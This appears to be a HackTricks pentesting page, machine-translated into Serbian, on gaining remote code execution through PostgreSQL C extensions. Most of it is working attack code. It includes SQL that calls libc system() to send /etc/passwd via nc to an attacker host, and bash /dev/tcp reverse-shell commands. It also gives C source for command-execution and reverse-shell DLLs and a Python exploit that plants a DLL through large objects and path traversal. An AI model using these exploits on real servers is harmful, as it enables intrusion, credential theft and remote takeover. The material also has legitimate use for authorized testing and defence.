# RCE with PostgreSQL Extensions

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetiƒçku bezbednost**? ≈Ωelite da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili ≈æelite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru≈æite se** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## PostgreSQL Ekstenzije

PostgreSQL je razvijen sa moguƒáno≈°ƒáu pro≈°irivosti kao osnovnom karakteristikom, omoguƒáavajuƒái mu da bez problema integri≈°e ekstenzije kao da su ugraƒëene funkcionalnosti. Ove ekstenzije, su≈°tinski biblioteke napisane u C-u, obogaƒáuju bazu podataka dodatnim funkcijama, operatorima ili tipovima.

Od verzije 8.1 nadalje, postoji specifiƒçan zahtev za ekstenzijske biblioteke: moraju biti kompajlirane sa posebnim zaglavljem. Bez toga, PostgreSQL ih neƒáe izvr≈°iti, obezbeƒëujuƒái kori≈°ƒáenje samo kompatibilnih i potencijalno bezbednih ekstenzija.

Takoƒëe, imajte na umu da **ako ne znate kako** [**da otpremite fajlove na ≈ærtvu zloupotrebom PostgreSQL-a, trebali biste proƒçitati ovaj post.**](big-binary-files-upload-postgresql.md)

### RCE na Linux-u

**Za vi≈°e informacija pogledajte:** [**https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/**](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)

Izvr≈°avanje sistemskih komandi iz PostgreSQL-a verzije 8.1 i starijih je proces koji je jasno dokumentovan i jednostavan. Moguƒáe je koristiti ovaj: [Metasploit modul](https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres\_payload).

```sql
CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');

# You can also create functions to open and write files
CREATE OR REPLACE FUNCTION open(cstring, int, int) RETURNS int AS '/lib/libc.so.6', 'open' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION write(int, cstring, int) RETURNS int AS '/lib/libc.so.6', 'write' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION close(int) RETURNS int AS '/lib/libc.so.6', 'close' LANGUAGE 'C' STRICT;
```

<details>

<summary>Upisivanje binarnog fajla iz base64</summary>

Da biste upisali binarni fajl u postgresu, mo≈æda ƒáete morati koristiti base64, ovo ƒáe biti korisno za tu svrhu:

```sql
CREATE OR REPLACE FUNCTION write_to_file(file TEXT, s TEXT) RETURNS int AS
$$
DECLARE
fh int;
s int;
w bytea;
i int;
BEGIN
SELECT open(textout(file)::cstring, 522, 448) INTO fh;

IF fh <= 2 THEN
RETURN 1;
END IF;

SELECT decode(s, 'base64') INTO w;

i := 0;
LOOP
EXIT WHEN i >= octet_length(w);

SELECT write(fh,textout(chr(get_byte(w, i)))::cstring, 1) INTO rs;

IF rs < 0 THEN
RETURN 2;
END IF;

i := i + 1;
END LOOP;

SELECT close(fh) INTO rs;

RETURN 0;

END;
$$ LANGUAGE 'plpgsql';
```

</details>

Meƒëutim, kada je poku≈°ano na veƒáim verzijama, **prikazana je sledeƒáa gre≈°ka**:

```c
ERROR:  incompatible library ‚Äú/lib/x86_64-linux-gnu/libc.so.6‚Äù: missing magic block
HINT:  Extension libraries are required to use the PG_MODULE_MAGIC macro.
```

Ova gre≈°ka je obja≈°njena u [PostgreSQL dokumentaciji](https://www.postgresql.org/docs/current/static/xfunc-c.html):

> Da bi se osiguralo da se dinamiƒçki uƒçitani objektni fajl ne uƒçita u nekompatibilni server, PostgreSQL proverava da li fajl sadr≈æi "magic block" sa odgovarajuƒáim sadr≈æajem. Ovo omoguƒáava serveru da otkrije oƒçigledne nekompatibilnosti, kao ≈°to je kod kompajliran za drugu glavnu verziju PostgreSQL-a. Magic block je obavezan od PostgreSQL verzije 8.2. Da biste ukljuƒçili magic block, napi≈°ite ovo u jednom (i samo jednom) od izvornih fajlova modula, nakon ≈°to ste ukljuƒçili zaglavlje fmgr.h:
>
> `#ifdef PG_MODULE_MAGIC`\
> `PG_MODULE_MAGIC;`\
> `#endif`

Od verzije PostgreSQL-a 8.2, proces za napadaƒça da iskoristi sistem je postao izazovniji. Napadaƒç mora ili koristiti biblioteku koja veƒá postoji na sistemu ili otpremiti prilagoƒëenu biblioteku. Ova prilagoƒëena biblioteka mora biti kompajlirana protiv kompatibilne glavne verzije PostgreSQL-a i mora sadr≈æati odreƒëeni "magic block". Ova mera znaƒçajno poveƒáava te≈æinu iskori≈°ƒáavanja PostgreSQL sistema, jer zahteva dublje razumevanje arhitekture sistema i kompatibilnosti verzija.

#### Kompajliranje biblioteke

Dobijte verziju PostgreSQL-a sa:

```sql
SELECT version();
PostgreSQL 9.6.3 on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18) 6.3.0 20170516, 64-bit
```

Za kompatibilnost je va≈æno da se glavne verzije poklapaju. Stoga, kompajliranje biblioteke sa bilo kojom verzijom unutar serije 9.6.x trebalo bi osigurati uspe≈°nu integraciju.

Da biste instalirali tu verziju na svom sistemu:

```bash
apt install postgresql postgresql-server-dev-9.6
```

I kompajlirajte biblioteku:

```c
//gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
#include <string.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
char* command = PG_GETARG_CSTRING(0);
PG_RETURN_INT32(system(command));
}
```

Zatim otpremite kompajliranu biblioteku i izvr≈°ite komande sa:

```bash
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"');
#Notice the double single quotes are needed to scape the qoutes
```

Mo≈æete pronaƒái ovu **biblioteku prekompajliranu** za nekoliko razliƒçitih verzija PostgreSQL-a, a ƒçak mo≈æete i **automatizovati ovaj proces** (ako imate pristup PostgreSQL-u) sa:

{% embed url="https://github.com/Dionach/pgexec" %}

### RCE na Windows-u

Sledeƒáa DLL datoteka uzima kao ulaz **ime binarne datoteke** i **broj** **puta** koje ≈æelite da je izvr≈°ite i izvr≈°ava je:

```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum pgsql_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(pgsql_exec);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
pgsql_exec(PG_FUNCTION_ARGS)
{
/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

/* retrieve the second argument that is passed to the function (an integer)
that will serve as our counter limit*/

int instances = PG_GETARG_INT32(1);

for (int c = 0; c < instances; c++) {
/*launch the process passed in the first parameter*/
ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
}
PG_RETURN_VOID();
}
```

Mo≈æete pronaƒái DLL kompajliran u ovom zipu:

{% file src="../../../.gitbook/assets/pgsql_exec.zip" %}

Mo≈æete naznaƒçiti ovom DLL-u **koju binarnu datoteku da izvr≈°i** i koliko puta da je izvr≈°i, u ovom primeru ƒáe izvr≈°iti `calc.exe` 2 puta:

```bash
CREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
SELECT remote_exec('calc.exe', 2);
DROP FUNCTION remote_exec(text, integer);
```

U [**ovde**](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html) mo≈æete pronaƒái ovaj reverzni shell:

```c
#define PG_REVSHELL_CALLHOME_SERVER "10.10.10.10"
#define PG_REVSHELL_CALLHOME_PORT "4444"

#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <winsock2.h>

#pragma comment(lib,"ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

#pragma warning(push)
#pragma warning(disable: 4996)
#define _WINSOCK_DEPRECATED_NO_WARNINGS

BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL,
_In_ DWORD fdwReason,
_In_ LPVOID lpvReserved)
{
WSADATA wsaData;
SOCKET wsock;
struct sockaddr_in server;
char ip_addr[16];
STARTUPINFOA startupinfo;
PROCESS_INFORMATION processinfo;

char *program = "cmd.exe";
const char *ip = PG_REVSHELL_CALLHOME_SERVER;
u_short port = atoi(PG_REVSHELL_CALLHOME_PORT);

WSAStartup(MAKEWORD(2, 2), &wsaData);
wsock = WSASocket(AF_INET, SOCK_STREAM,
IPPROTO_TCP, NULL, 0, 0);

struct hostent *host;
host = gethostbyname(ip);
strcpy_s(ip_addr, sizeof(ip_addr),
inet_ntoa(*((struct in_addr *)host->h_addr)));

server.sin_family = AF_INET;
server.sin_port = htons(port);
server.sin_addr.s_addr = inet_addr(ip_addr);

WSAConnect(wsock, (SOCKADDR*)&server, sizeof(server),
NULL, NULL, NULL, NULL);

memset(&startupinfo, 0, sizeof(startupinfo));
startupinfo.cb = sizeof(startupinfo);
startupinfo.dwFlags = STARTF_USESTDHANDLES;
startupinfo.hStdInput = startupinfo.hStdOutput =
startupinfo.hStdError = (HANDLE)wsock;

CreateProcessA(NULL, program, NULL, NULL, TRUE, 0,
NULL, NULL, &startupinfo, &processinfo);

return TRUE;
}

#pragma warning(pop) /* re-enable 4996 */

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum dummy_function(PG_FUNCTION_ARGS);

PG_FUNCTION_INFO_V1(add_one);

Datum dummy_function(PG_FUNCTION_ARGS)
{
int32 arg = PG_GETARG_INT32(0);

PG_RETURN_INT32(arg + 1);
}
```

Obratite pa≈ænju kako je u ovom sluƒçaju **zlonamjeran kod unutar funkcije DllMain**. To znaƒçi da u ovom sluƒçaju nije potrebno izvr≈°iti uƒçitanu funkciju u postgresql-u, samo **uƒçitavanje DLL-a** ƒáe **izvr≈°iti** obrnutu ljusku:

```c
CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS '\\10.10.10.10\shared\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
```

### RCE u najnovijim verzijama Postgresa

U **najnovijim verzijama** PostgreSQL-a, uvedena su ograniƒçenja koja **onemoguƒáavaju** `superuser`-u da **uƒçitava** deljene biblioteke izuzev iz odreƒëenih direktorijuma, kao ≈°to su `C:\Program Files\PostgreSQL\11\lib` na Windowsu ili `/var/lib/postgresql/11/lib` na \*nix sistemima. Ovi direktorijumi su **za≈°tiƒáeni** od operacija pisanja od strane korisnika NETWORK\_SERVICE ili postgres.

Uprkos ovim ograniƒçenjima, moguƒáe je da autentifikovani `superuser` baze podataka **pi≈°e binarne fajlove** na fajl sistem koristeƒái "large objects". Ova moguƒánost se pro≈°iruje na pisanje unutar direktorijuma `C:\Program Files\PostgreSQL\11\data`, ≈°to je neophodno za operacije baze podataka kao ≈°to su a≈æuriranje ili kreiranje tabela.

Znaƒçajna ranjivost nastaje iz komande `CREATE FUNCTION`, koja **omoguƒáava prolazak kroz direktorijume** do data direktorijuma. Kao rezultat toga, autentifikovani napadaƒç mo≈æe **iskoristiti ovaj prolazak** da bi napisao deljenu biblioteku u data direktorijum, a zatim je **uƒçitao**. Ovaj napad omoguƒáava napadaƒçu izvr≈°avanje proizvoljnog koda, posti≈æuƒái izvr≈°avanje izvornog koda na sistemu.

#### Tok napada

Prvo, morate **koristiti large objects za otpremanje dll fajla**. Mo≈æete videti kako to uraditi ovde:

{% content-ref url="big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

Nakon ≈°to ste otpremili ekstenziju (sa nazivom poc.dll za ovaj primer) u data direktorijum, mo≈æete je uƒçitati sa:

```c
create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
select connect_back('192.168.100.54', 1234);
```

_Napomena da ne morate dodavati ekstenziju `.dll` jer ƒáe funkcija za kreiranje dodati sama._

Za vi≈°e informacija **proƒçitajte** [**originalnu publikaciju ovde**](https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html)**.**\
U toj publikaciji **ovo je bio** [**kod koji se koristi za generisanje postgres ekstenzije**](https://github.com/sourceincite/tools/blob/master/pgpwn.c) (_za nauƒçiti kako kompajlirati postgres ekstenziju proƒçitajte neku od prethodnih verzija_).\
Na istoj stranici je dat **exploit za automatizaciju** ove tehnike:

```python
#!/usr/bin/env python3
import sys

if len(sys.argv) != 4:
print("(+) usage %s <connectback> <port> <dll/so>" % sys.argv[0])
print("(+) eg: %s 192.168.100.54 1234 si-x64-12.dll" % sys.argv[0])
sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
lib = sys.argv[3]
with open(lib, "rb") as dll:
d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
start = i * 2048
end   = (i+1) * 2048
if i == 0:
sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
else:
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
end   = (i+1) * 2048
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, 'poc.dll');"
sql += "create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;"
sql += "select connect_back('%s', %d);" % (host, port)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function connect_back(text, integer);")
```

## Reference

* [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
* [https://www.exploit-db.com/papers/13084](https://www.exploit-db.com/papers/13084)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? ≈Ωelite li da vidite **va≈°u kompaniju reklamiranu na HackTricks-u**? Ili ≈æelite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru≈æite se** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
